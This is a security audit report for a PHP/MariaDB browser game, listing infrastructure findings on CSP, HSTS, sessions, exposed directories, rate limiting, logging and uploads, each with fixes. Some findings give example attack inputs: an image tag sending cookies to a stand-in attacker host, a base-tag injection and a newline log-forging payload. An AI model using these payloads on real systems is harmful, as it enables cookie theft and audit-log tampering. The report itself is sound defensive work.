# Infrastructure Deep-Dive -- Round 2

**Audit Date:** 2026-03-03
**Scope:** Server configuration, HTTP security headers, session management, file exposure, error handling, logging, rate limiting, CSRF, database connection security, upload handling, directory protection
**Stack:** Debian 12, Apache 2, PHP 8.2, MariaDB 10.11
**Auditor:** Security Engineer (Round 2 deep-dive of Round 1 findings)

---

## Table of Contents

1. [Critical Findings](#critical-findings)
2. [High Findings](#high-findings)
3. [Medium Findings](#medium-findings)
4. [Low Findings](#low-findings)
5. [Informational](#informational)
6. [Summary Matrix](#summary-matrix)
7. [Remediation Priority](#remediation-priority)

---

## Critical Findings

### INFRA-R2-001 [CRITICAL] .htaccess:7 -- CSP allows unsafe-inline for both script-src and style-src

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 7

**Current:**
```
Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'"
```

**Description:** `'unsafe-inline'` in `script-src` completely defeats the XSS protection that CSP provides. Any reflected or stored XSS payload that injects an inline `<script>` tag will execute freely. The `'unsafe-inline'` in `style-src` is lower risk but still enables CSS-based data exfiltration attacks. The game uses inline `<script>` blocks in `basicprivatehtml.php` (lines 427-463) with dynamically generated JavaScript for real-time resource counters, which is why `unsafe-inline` was added -- but this can be solved properly.

**Impact:** CSP is effectively a paper wall for script execution. An XSS vulnerability anywhere in the application bypasses all CSP protections.

**Fix:**
```
# Phase 1: Use nonces (requires PHP to generate a unique nonce per request)
# In session_init.php or a new csp.php include:
#   $csp_nonce = base64_encode(random_bytes(16));
#   header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-$csp_nonce' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'self'");
# Then add nonce="<?= $csp_nonce ?>" to every inline <script> tag

# Phase 2 (quick interim): Move inline JS from basicprivatehtml.php to an external .js file
# This removes the need for unsafe-inline in script-src entirely
```

The nonce approach is the gold standard. The CSP header must be set via PHP `header()` (not `.htaccess`) because nonces must be unique per request.

---

### INFRA-R2-002 [CRITICAL] No HSTS header -- SSL stripping attacks possible once HTTPS is enabled

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`

**Current:** No `Strict-Transport-Security` header anywhere in the codebase.

**Description:** Once HTTPS is enabled (planned per project TODO), without HSTS, a network attacker can perform SSL stripping via MITM: intercepting the first HTTP request before the 301 redirect to HTTPS and serving the entire session over plain HTTP. HSTS tells browsers to always use HTTPS for the domain, eliminating this attack class entirely. Without HSTS, every first visit from a new browser or after cache expiry is vulnerable.

**Impact:** Session cookies, credentials, and all game data can be intercepted on first connection or after HSTS expiry.

**Fix:** Add to `.htaccess` inside the `<IfModule mod_headers.c>` block, to be activated when HTTPS is live:
```apache
# Uncomment when HTTPS is enabled:
# Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

Also add HTTP-to-HTTPS redirect in Apache vhost or `.htaccess`:
```apache
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

---

### INFRA-R2-003 [CRITICAL] session.cookie_secure conditional -- sessions transmitted over HTTP

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/session_init.php` line 8

**Current:**
```php
ini_set('session.cookie_secure', !empty($_SERVER['HTTPS']) ? 1 : 0);
```

**Description:** This conditional means that on HTTP connections, `cookie_secure` is set to 0, allowing the session cookie (`PHPSESSID`) to be transmitted in cleartext. Even after HTTPS is enabled, if a single HTTP request leaks through (e.g., mixed content, cached bookmark, DNS rebinding), the session cookie is exposed. The conditional logic is dangerous because `$_SERVER['HTTPS']` can be manipulated behind reverse proxies or load balancers.

**Impact:** Full session hijacking via network sniffing. Combined with no HSTS, this is actively exploitable on any shared network.

**Fix:** Hardcode to 1 once HTTPS is enabled. Until then, document as accepted risk:
```php
ini_set('session.cookie_secure', 1);
```

---

## High Findings

### INFRA-R2-004 [HIGH] .htaccess:36-41 -- mod_php directives silently ignored under PHP-FPM

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` lines 36-41

**Current:**
```apache
<IfModule mod_php.c>
    php_flag display_errors off
    php_flag log_errors on
    php_value error_reporting 32767
    php_flag expose_php off
</IfModule>
```

**Description:** Debian 12 with PHP 8.2 typically uses PHP-FPM via `mod_proxy_fcgi`, not `mod_php`. The `<IfModule mod_php.c>` condition means this entire block is silently ignored if mod_php is not loaded. In that case, `display_errors`, `log_errors`, `error_reporting`, and `expose_php` all fall back to whatever is in `php.ini` -- which on Debian 12 defaults to `display_errors = On` in development configuration. If the VPS uses the development php.ini, PHP errors (including SQL query fragments, file paths, and stack traces) are displayed to users.

**Impact:** Information disclosure of internal paths, database schema, and application logic via PHP error messages.

**Fix:** Set these in the PHP-FPM pool configuration `/etc/php/8.2/fpm/pool.d/www.conf`:
```ini
php_flag[display_errors] = off
php_flag[log_errors] = on
php_value[error_reporting] = 24575
php_flag[expose_php] = off
```

Or set them in `php.ini` directly. Also add runtime enforcement in `session_init.php`:
```php
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('expose_php', '0');
```

---

### INFRA-R2-005 [HIGH] .htaccess:39 -- error_reporting E_ALL (32767) generates excessive logs in production

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 39

**Current:**
```apache
php_value error_reporting 32767
```

**Description:** `E_ALL` (32767) on PHP 8.2 logs every deprecation notice, strict standards warning, and type coercion notice. This generates massive log volumes that: (1) fill disk space over time, causing application failure, (2) create noise that buries genuine errors, (3) add I/O overhead on every request. The recommended production level is `E_ALL & ~E_DEPRECATED & ~E_STRICT` (24575).

**Impact:** Disk space exhaustion leading to denial of service; error signal buried in noise.

**Fix:**
```apache
php_value error_reporting 24575
```

And mirror in PHP-FPM config (see INFRA-R2-004).

---

### INFRA-R2-006 [HIGH] Missing Permissions-Policy header -- browser APIs unrestricted

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`

**Current:** No `Permissions-Policy` header is set.

**Description:** Without `Permissions-Policy` (successor to `Feature-Policy`), the browser grants default permissions for camera, microphone, geolocation, payment, USB, and other sensitive APIs. If an XSS or content injection attack occurs, the attacker can silently access these APIs. A strategy game has zero legitimate need for any of these features.

**Impact:** XSS escalation to device hardware access (camera, microphone, geolocation).

**Fix:** Add to `.htaccess` inside `<IfModule mod_headers.c>`:
```apache
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()"
```

---

### INFRA-R2-007 [HIGH] Missing session.use_only_cookies and session.use_trans_sid

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/session_init.php`

**Current:** Only these session settings are configured:
```php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', !empty($_SERVER['HTTPS']) ? 1 : 0);
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.gc_maxlifetime', 3600);
```

**Description:** Two critical session settings are missing:
- `session.use_only_cookies = 1` -- Without this, PHP may accept session IDs from URL query parameters (`?PHPSESSID=xxx`), enabling session fixation attacks where an attacker crafts a URL containing a known session ID.
- `session.use_trans_sid = 0` -- Without this, PHP may automatically append session IDs to URLs and forms, leaking session tokens in Referer headers, browser history, and server logs.

While `session.use_strict_mode = 1` mitigates the worst session fixation scenarios, defense-in-depth requires explicitly disabling URL-based session propagation.

**Impact:** Session fixation via crafted URLs; session token leakage in HTTP Referer headers.

**Fix:** Add to `session_init.php` before `session_start()`:
```php
ini_set('session.use_only_cookies', 1);
ini_set('session.use_trans_sid', 0);
```

---

### INFRA-R2-008 [HIGH] No .htaccess protection on /tests/ directory -- test code accessible via web

**File:** `/home/guortates/TVLW/The-Very-Little-War/tests/`

**Description:** The `/tests/` directory contains PHPUnit test files including `bootstrap.php`, which loads database connection code and game functions. There is no `.htaccess` file in this directory to deny web access. If the web root includes this directory (as it does in the current deployment), any test file can be directly requested. The test bootstrap loads `includes/connexion.php` which connects to the database. An attacker requesting `tests/bootstrap.php` could trigger database connections, and test files could expose internal application structure.

**Impact:** Information disclosure, potential code execution via test files, database connection from untrusted context.

**Fix:** Create `/tests/.htaccess`:
```apache
<IfModule mod_authz_core.c>
    Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
    Order deny,allow
    Deny from all
</IfModule>
```

---

### INFRA-R2-009 [HIGH] No .htaccess protection on /vendor/ directory

**File:** `/home/guortates/TVLW/The-Very-Little-War/vendor/`

**Description:** The `/vendor/` directory (Composer dependencies including PHPUnit, Sebastian, etc.) has no `.htaccess` protection. Vendor packages may contain test files, documentation, and even executable PHP scripts that should never be web-accessible. An attacker can enumerate dependency versions by requesting known paths like `/vendor/phpunit/phpunit/phpunit` or reading `composer.json`.

**Impact:** Dependency version disclosure enabling targeted exploitation of known CVEs; potential code execution via vendor test utilities.

**Fix:** Create `/vendor/.htaccess`:
```apache
<IfModule mod_authz_core.c>
    Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
    Order deny,allow
    Deny from all
</IfModule>
```

---

### INFRA-R2-010 [HIGH] No .htaccess protection on /migrations/ directory -- SQL files and migrate.php web-accessible

**File:** `/home/guortates/TVLW/The-Very-Little-War/migrations/`

**Description:** The migrations directory contains 14 SQL files detailing the entire database schema (tables, columns, indexes, types) and a `migrate.php` script that connects to the database and executes all pending migrations. While `.sql` files are blocked by the root `.htaccess` `FilesMatch` rule, `migrate.php` is NOT blocked. An attacker requesting `/migrations/migrate.php` would trigger the migration runner, potentially executing schema changes against the production database. Even if no pending migrations exist, this confirms the application uses a migration system and reveals directory structure via error messages.

**Impact:** Unauthorized database schema modification; information disclosure of database structure.

**Fix:** Create `/migrations/.htaccess`:
```apache
<IfModule mod_authz_core.c>
    Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
    Order deny,allow
    Deny from all
</IfModule>
```

---

### INFRA-R2-011 [HIGH] Rate limiter uses /tmp filesystem -- vulnerable to bypass and race conditions

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/rate_limiter.php` lines 7-8

**Current:**
```php
define('RATE_LIMIT_DIR', '/tmp/tvlw_rates');
```

**Description:** Multiple issues with the file-based rate limiter:

1. **Shared /tmp:** On shared hosting or multi-tenant environments, `/tmp` is world-readable. Other processes or users can read, modify, or delete rate limit files, bypassing limits entirely.
2. **Reboot clears state:** System reboots clear `/tmp`, resetting all rate limits. An attacker who can trigger a reboot (or who knows when maintenance reboots occur) gets a fresh window of unlimited attempts.
3. **Race condition:** Between reading the file and writing the updated count (lines 21-36), another concurrent request can read the same file and both pass the check. The `LOCK_EX` on write does not prevent the TOCTOU race on read. Under high concurrency (e.g., distributed brute force), the effective rate limit is much higher than configured.
4. **No IP validation:** The `$identifier` parameter (typically `$_SERVER['REMOTE_ADDR']`) is used directly in an MD5 hash for the filename. If behind a proxy without proper configuration, `REMOTE_ADDR` could be the proxy IP, rate-limiting all users behind that proxy as one, or conversely, an attacker could rotate `X-Forwarded-For` to bypass per-IP limits (though the code correctly uses `REMOTE_ADDR`, not forwarded headers).

**Impact:** Brute force protection can be bypassed via race conditions, server reboots, or filesystem manipulation.

**Fix (immediate):** Move to a non-volatile directory with restricted permissions:
```php
define('RATE_LIMIT_DIR', __DIR__ . '/../data/rates');
// Ensure: mkdir data/rates, chmod 700, chown www-data
```

**Fix (recommended):** Replace file-based limiter with MariaDB-backed rate limiting using atomic `INSERT ... ON DUPLICATE KEY UPDATE` for race-condition-free counting, or use a Redis/Memcached backend.

---

### INFRA-R2-012 [HIGH] connexion.php:17 -- Database connection error reveals application language/framework

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/connexion.php` line 17

**Current:**
```php
die('Erreur de connexion a la base de donnees.');
```

**Description:** While this error message does not expose credentials or technical details, it is output directly via `die()` with no HTML wrapper, no Content-Type header, and exposes the application language (French). Combined with other information leakage vectors, this helps an attacker fingerprint the application. More critically, line 11 uses `die('Configuration error. Contact administrator.')` -- the inconsistency between French and English error messages leaks that the codebase was partially refactored by a different developer.

The `error_log()` call on line 10 correctly logs the technical details server-side without exposing them to users. However, the `die()` calls do not set a proper HTTP status code (they return 200 OK with error body).

**Impact:** Application fingerprinting; improper HTTP status codes for error states.

**Fix:**
```php
if (!$db_user || $db_name === false) {
    error_log('TVLW: DB credentials not loaded from .env');
    http_response_code(503);
    die('Service temporarily unavailable.');
}

$base = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
if (!$base) {
    error_log('TVLW: Database connection failed: ' . mysqli_connect_error());
    http_response_code(503);
    die('Service temporarily unavailable.');
}
```

---

## Medium Findings

### INFRA-R2-013 [MEDIUM] database.php:14,61 -- SQL query text logged in error messages

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/database.php` lines 14, 21, 61, 68

**Current:**
```php
error_log("SQL Prepare Error: " . mysqli_error($base) . " | Query: " . $sql);
```

**Description:** When a SQL prepare statement fails, the full SQL query text is written to the PHP error log. While this is useful for debugging, the queries may contain table names, column names, and query structures that reveal the database schema. If an attacker gains read access to log files (via LFI, log injection, or misconfigured log viewer), they obtain a detailed map of the database. The `mysqli_error()` output may also contain database version information and internal error details.

Additionally, `constructions.php:254` and `armee.php:133,209` have the same pattern outside of the database helper functions, suggesting these files were not fully migrated to use the centralized `dbQuery`/`dbExecute` helpers.

**Impact:** Database schema disclosure via log files.

**Fix:** Log a sanitized error without the full query:
```php
error_log("SQL Prepare Error: " . mysqli_error($base) . " | QueryRef: " . md5($sql));
```

Or use structured logging through `logger.php` which provides rate-limited, categorized logging.

---

### INFRA-R2-014 [MEDIUM] logger.php -- No log injection protection

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/logger.php` lines 26-30

**Current:**
```php
$login = $_SESSION['login'] ?? 'anonymous';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$line = "[$timestamp] [$levelName] [$category] [$login@$ip] $message$contextStr\n";
```

**Description:** The `$login` value comes from `$_SESSION['login']` which is set during authentication and should be clean. However, the `$message` and `$context` parameters are passed directly from callers without sanitization. If any caller passes user-controlled data into the message (e.g., `logInfo('AUTH', 'Login failed for: ' . $_POST['loginConnexion'])`), an attacker could inject newlines and fake log entries:

```
loginConnexion=user%0A[2026-03-03 12:00:00] [INFO] [AUTH] [admin@127.0.0.1] Login successful
```

This creates a fake log entry that appears to show a successful admin login, poisoning audit trails.

**Impact:** Log forgery, audit trail poisoning, false positive security alerts.

**Fix:** Sanitize log content by stripping newlines and control characters:
```php
$message = str_replace(["\r", "\n", "\t"], ['\\r', '\\n', '\\t'], $message);
$login = str_replace(["\r", "\n", "\t", '[', ']'], '', $login);
```

---

### INFRA-R2-015 [MEDIUM] logger.php -- No log rotation or size limits

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/logger.php`

**Description:** Log files are created daily (`date('Y-m-d') . '.log'`) but never rotated, compressed, or deleted. Over months of operation:
- With `error_reporting = E_ALL` (32767), verbose PHP notices generate large log volumes.
- Application logs via `gameLog()` add to the volume.
- No maximum file size check before writing.
- No mechanism to delete logs older than N days.

On a VPS with limited disk space, this will eventually fill the partition, causing the application (and potentially the entire server) to fail.

**Impact:** Disk space exhaustion leading to denial of service.

**Fix:** Add a logrotate configuration at `/etc/logrotate.d/tvlw`:
```
/var/www/html/logs/*.log {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 www-data www-data
}
```

Or add size-based rotation in the logger itself:
```php
$maxSize = 10 * 1024 * 1024; // 10MB
if (file_exists($filename) && filesize($filename) > $maxSize) {
    rename($filename, $filename . '.1');
}
```

---

### INFRA-R2-016 [MEDIUM] logger.php:21 -- Log directory created with 0755 permissions

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/logger.php` line 21

**Current:**
```php
mkdir(LOG_DIR, 0755, true);
```

**Description:** If the `logs/` directory does not exist, it is created with permissions `0755` (owner read/write/execute, group and others read/execute). This allows any user on the system to list and read log files, which contain session login names, IP addresses, security events, and potentially sensitive application data. The directory should be `0750` or `0700`.

Note: the `logs/.htaccess` file correctly contains `Deny from all` to prevent web access, but local filesystem access is still overly permissive.

**Impact:** Information disclosure to other users on the same server.

**Fix:**
```php
mkdir(LOG_DIR, 0750, true);
```

---

### INFRA-R2-017 [MEDIUM] CSRF token is not rotated per-form -- single token per session

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/csrf.php`

**Current:**
```php
function csrfToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}
```

**Description:** A single CSRF token is generated per session and reused for all forms and all requests. This is a synchronizer token pattern, which is valid and secure against CSRF, but has limitations:

1. **Token leakage amplification:** If the token leaks once (via Referer header, cached page, or XSS), it is valid for the entire session duration. A per-form or per-request token limits the blast radius.
2. **No token binding:** The token is not bound to any specific action, so a leaked token from a low-privilege form (e.g., change description) can be reused for high-privilege actions (e.g., delete account).
3. **Token survives session regeneration:** When `session_regenerate_id(true)` is called in `basicprivatephp.php:22`, the CSRF token is preserved (since it is in `$_SESSION`), which is correct behavior, but worth noting.

The current implementation is adequate for the application's threat model but could be improved.

**Impact:** If a CSRF token is leaked, it remains valid for all actions for the rest of the session.

**Fix (recommended but not urgent):**
```php
function csrfToken($formId = 'default') {
    if (empty($_SESSION['csrf_tokens'][$formId]) ||
        (time() - ($_SESSION['csrf_token_time'][$formId] ?? 0)) > 1800) {
        $_SESSION['csrf_tokens'][$formId] = bin2hex(random_bytes(32));
        $_SESSION['csrf_token_time'][$formId] = time();
    }
    return $_SESSION['csrf_tokens'][$formId];
}
```

---

### INFRA-R2-018 [MEDIUM] .htaccess:14 -- FilesMatch does not block .env files

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 14

**Current:**
```apache
<FilesMatch "\.(sql|psd|md|json|xml|lock|gitignore)$">
```

**Description:** The `.env` file (containing database credentials) is not listed in the `FilesMatch` pattern. The `.env` file is in `.gitignore` and does not exist in the git repository, but on the production VPS it MUST exist (as `connexion.php` loads it). The `.htaccess` hidden file rule (`^\.`) on line 25 DOES block dotfiles including `.env`, which provides protection. However, this is a defense-in-depth gap: if a misconfigured reverse proxy, URL rewrite, or path normalization issue bypasses the dotfile rule, `.env` would be served.

The `.env.example` file (which does exist in the repo and contains template credentials) IS blocked by the dotfile rule but NOT by the extension rule.

**Impact:** Potential exposure of database credentials if the dotfile rule is bypassed.

**Fix:** Add `.env` explicitly to the extension-based block:
```apache
<FilesMatch "\.(sql|psd|md|json|xml|lock|gitignore|env)$">
```

---

### INFRA-R2-019 [MEDIUM] .htaccess:14 -- FilesMatch does not block .php.bak, .log, .ini, .yml, .conf, .sh files

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 14

**Current:**
```apache
<FilesMatch "\.(sql|psd|md|json|xml|lock|gitignore)$">
```

**Description:** Several dangerous file extensions are not blocked:
- `.log` -- Application log files if placed in web root
- `.ini` -- PHP configuration files
- `.yml` / `.yaml` -- Configuration files
- `.conf` -- Server configuration
- `.sh` -- Shell scripts
- `.bak` -- Backup files (`.gitignore` lists `connexion.php.bak`)
- `.swp` / `.swo` -- Vim swap files (in `.gitignore` but not `.htaccess`)
- `.tar` / `.gz` / `.zip` -- Archive files

While no current files with these extensions exist in the web root (verified: no `.bak`, `.old` files found), this is a proactive defense against future file creation or accidental deployments.

**Impact:** Accidental exposure of backup files, configuration files, or archives containing sensitive data.

**Fix:**
```apache
<FilesMatch "\.(sql|psd|md|json|xml|lock|gitignore|env|log|ini|yml|yaml|conf|sh|bak|swp|swo|tar|gz|zip)$">
```

---

### INFRA-R2-020 [MEDIUM] .htaccess:5 -- X-XSS-Protection header is deprecated and can cause issues

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 5

**Current:**
```apache
Header set X-XSS-Protection "1; mode=block"
```

**Description:** The `X-XSS-Protection` header activates the browser's built-in XSS filter, which has been deprecated and removed from modern browsers (Chrome removed it in version 78, Firefox never supported it, Edge removed it). Worse, in some edge cases on older browsers, the filter itself can be exploited to introduce XSS vulnerabilities via selective content blocking. The modern replacement is a proper CSP policy (which is already in place, albeit with `unsafe-inline`).

**Impact:** No positive security value in modern browsers; potential XSS introduction in legacy browsers.

**Fix:** Set to `0` to explicitly disable or remove entirely:
```apache
Header set X-XSS-Protection "0"
```

---

### INFRA-R2-021 [MEDIUM] connexion.php -- No connection timeout or error mode configuration

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/connexion.php`

**Current:**
```php
$base = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
```

**Description:** The database connection has no:
1. **Connection timeout:** If the database server is slow or unreachable, the PHP process hangs for the default MySQL timeout (30 seconds), holding the Apache worker thread hostage. Under load, this can exhaust all worker threads.
2. **Error reporting mode:** `mysqli` defaults to returning `false` on errors rather than throwing exceptions. While the code checks for `false` returns, a `mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT)` mode would catch unchecked error paths.
3. **Character set verification:** `mysqli_set_charset($base, 'utf8')` sets the connection charset to `utf8` (3-byte MySQL utf8, not true UTF-8). For full Unicode support and to prevent certain multi-byte character attacks, `utf8mb4` should be used.

**Impact:** Worker thread exhaustion under database stress; potential character encoding attacks; silent error swallowing.

**Fix:**
```php
mysqli_options($base, MYSQLI_OPT_CONNECT_TIMEOUT, 5);
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
mysqli_set_charset($base, 'utf8mb4');
```

Note: Enabling `MYSQLI_REPORT_STRICT` requires wrapping database calls in try/catch to prevent uncaught exceptions from leaking error details.

---

### INFRA-R2-022 [MEDIUM] No Cache-Control headers on authenticated pages

**File:** Multiple -- `basicprivatephp.php`, `basicprivatehtml.php`

**Description:** Authenticated pages do not set `Cache-Control`, `Pragma`, or `Expires` headers. This allows browsers and intermediate proxies to cache authenticated content. A user who logs out on a shared computer can have their game state (resources, army composition, messages) viewable by the next user via the browser's back button or cache.

Grep confirms zero `Cache-Control` or `Pragma` headers are set anywhere in PHP code.

**Impact:** Sensitive game state cached and viewable after logout on shared devices.

**Fix:** Add to `basicprivatephp.php` at the top:
```php
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
```

---

### INFRA-R2-023 [MEDIUM] images/profil/.htaccess:2-3 -- Upload dir PHP execution relies on mod_php only

**File:** `/home/guortates/TVLW/The-Very-Little-War/images/profil/.htaccess` lines 2-3

**Current:**
```apache
<IfModule mod_php.c>
    php_flag engine off
</IfModule>
```

**Description:** The `php_flag engine off` directive only works with `mod_php`. Under PHP-FPM (the standard Debian 12 configuration), this directive is ignored and PHP files in the upload directory CAN be executed. The `FilesMatch` rule on lines 5-9 blocks `.php` files, which provides a second layer, but the `<IfModule mod_authz_core.c>` block only uses `Require all denied` -- it does not have a corresponding `!mod_authz_core.c` fallback for Apache 2.2 (though this is moot on Debian 12's Apache 2.4).

The real concern: the `FilesMatch` blocks only exactly `.php`. Files named `.php5`, `.phtml`, `.phar`, or `.php.jpg` might still be executable depending on Apache's PHP handler configuration.

**Impact:** Potential PHP code execution via uploaded files if PHP-FPM handler processes files in the upload directory.

**Fix:** Expand the PHP extension block:
```apache
<FilesMatch "\.(php|phtml|php5|php7|phar|phps)$">
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
</FilesMatch>
```

And add a handler removal directive that works with PHP-FPM:
```apache
<FilesMatch "\.ph(p[57]?|tml|ar|ps)$">
    SetHandler none
    ForceType text/plain
</FilesMatch>
```

---

## Low Findings

### INFRA-R2-024 [LOW] CSP allows img-src data: and https: -- broad allowlist

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 7

**Current CSP fragment:**
```
img-src 'self' data: https:
```

**Description:** `data:` in `img-src` allows inline data URIs for images, which can be used for tracking pixels and CSP bypass techniques. `https:` allows images from ANY HTTPS origin, which enables attackers to inject tracking images (e.g., `<img src="https://evil.com/track?cookie=...">`) via stored XSS or content injection. This is overly permissive for a game that only loads images from its own domain.

**Impact:** Data exfiltration via image loading; tracking pixel injection.

**Fix:**
```
img-src 'self'
```

If the game legitimately needs data URIs (e.g., for canvas operations), document the specific use case.

---

### INFRA-R2-025 [LOW] .htaccess:3,4 -- Security headers use "set" not "always set"

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` lines 3-7

**Current:**
```apache
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
```

**Description:** `Header set` only applies to successful (2xx) responses. Error responses (4xx, 5xx) do NOT receive these security headers. An attacker who triggers a 404 or 500 error can exploit the absence of `X-Frame-Options` and `X-Content-Type-Options` on those error pages. Using `Header always set` applies the headers to all responses regardless of status code.

**Impact:** Security headers missing on error pages, enabling clickjacking or MIME sniffing on error responses.

**Fix:**
```apache
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-XSS-Protection "0"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

---

### INFRA-R2-026 [LOW] No Cross-Origin-Opener-Policy (COOP) or Cross-Origin-Resource-Policy (CORP) headers

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess`

**Description:** Missing `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy` headers. COOP prevents other origins from opening a reference to the game in `window.opener` (Spectre side-channel mitigation). CORP prevents other origins from embedding the game's resources. These are part of the modern "cross-origin isolation" security model.

**Impact:** Spectre-class side-channel attacks; cross-origin resource embedding.

**Fix:**
```apache
Header always set Cross-Origin-Opener-Policy "same-origin"
Header always set Cross-Origin-Resource-Policy "same-origin"
```

---

### INFRA-R2-027 [LOW] inscription.php:40 -- Email logged during registration

**File:** `/home/guortates/TVLW/The-Very-Little-War/inscription.php` line 40

**Current:**
```php
logInfo('REGISTER', 'New player registered', ['login' => $loginInput, 'email' => $emailInput]);
```

**Description:** The player's email address is logged in plaintext in the application log file. Under GDPR (applicable since this is a French-language game likely serving EU users), personal data in logs creates compliance obligations around log retention, access control, and deletion requests. Email addresses in logs are unnecessary for security monitoring and create a data minimization violation.

**Impact:** GDPR compliance risk; email addresses exposed if log files are compromised.

**Fix:** Log only the login name, not the email:
```php
logInfo('REGISTER', 'New player registered', ['login' => $loginInput]);
```

---

### INFRA-R2-028 [LOW] basicprivatephp.php:74-85 -- Online tracking uses IP addresses directly

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/basicprivatephp.php` lines 74-85

**Current:**
```php
$donnees = dbFetchOne($base, 'SELECT COUNT(*) AS nbre_entrees FROM connectes WHERE ip = ?', 's', $_SERVER['REMOTE_ADDR']);
if ($donnees['nbre_entrees'] == 0) {
    dbExecute($base, 'INSERT INTO connectes VALUES(?, ?)', 'si', $_SERVER['REMOTE_ADDR'], $now);
}
```

**Description:** The `connectes` table stores raw IP addresses for tracking online users. This has two issues:
1. **GDPR:** IP addresses are personal data under EU law. Storing them requires a legal basis and retention policy.
2. **Behind proxy:** If the server is behind Cloudflare, nginx proxy, or a CDN, `$_SERVER['REMOTE_ADDR']` returns the proxy's IP, not the user's. This means all users appear as one IP, breaking the online count feature AND making rate limiting ineffective.

**Impact:** Inaccurate online counts behind proxies; GDPR compliance risk.

**Fix:** For proxy awareness, add IP resolution:
```php
function getClientIP() {
    // Only trust these headers if behind a known, controlled proxy
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}
```

For GDPR, consider hashing IPs: `$hashedIp = hash('sha256', $ip . $dailySalt)`.

---

### INFRA-R2-029 [LOW] env.php -- Environment variable loading has no type validation

**File:** `/home/guortates/TVLW/The-Very-Little-War/includes/env.php`

**Current:**
```php
function loadEnv($path) {
    if (!file_exists($path)) return;
    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        $parts = explode('=', $line, 2);
        if (count($parts) !== 2) continue;
        $name = trim($parts[0]);
        $value = trim($parts[1], " \t\n\r\0\x0B\"'");
        if (!getenv($name)) putenv("$name=$value");
    }
}
```

**Description:** The `putenv()` function places values into the process environment, which is shared across all PHP code running in the same process (including loaded extensions and libraries). Under `mod_php` with prefork MPM, this is isolated per request, but under PHP-FPM with worker threads or opcache, environment variables set via `putenv()` may leak between requests. Additionally, the function does not validate that the variable names are expected (e.g., only `DB_HOST`, `DB_USER`, `DB_PASS`, `DB_NAME`), so a compromised `.env` file could set arbitrary environment variables like `LD_PRELOAD`, `PATH`, or other security-sensitive values.

**Impact:** Potential environment variable injection if `.env` is compromised; thread-safety concern with `putenv()`.

**Fix:** Validate expected variable names:
```php
$allowedVars = ['DB_HOST', 'DB_USER', 'DB_PASS', 'DB_NAME'];
// ... in the loop:
if (!in_array($name, $allowedVars)) continue;
```

Consider using `$_ENV` or a static config array instead of `putenv()`.

---

### INFRA-R2-030 [LOW] CSP missing base-uri directive

**File:** `/home/guortates/TVLW/The-Very-Little-War/.htaccess` line 7

**Description:** The CSP policy does not include a `base-uri` directive. Without it, an attacker who can inject a `<base href="https://evil.com/">` tag can redirect all relative URLs (links, form actions, script sources) to their controlled domain. This is exploitable via HTML injection even without full XSS.

**Impact:** Relative URL hijacking via `<base>` tag injection.

**Fix:** Add to CSP:
```
base-uri 'self';
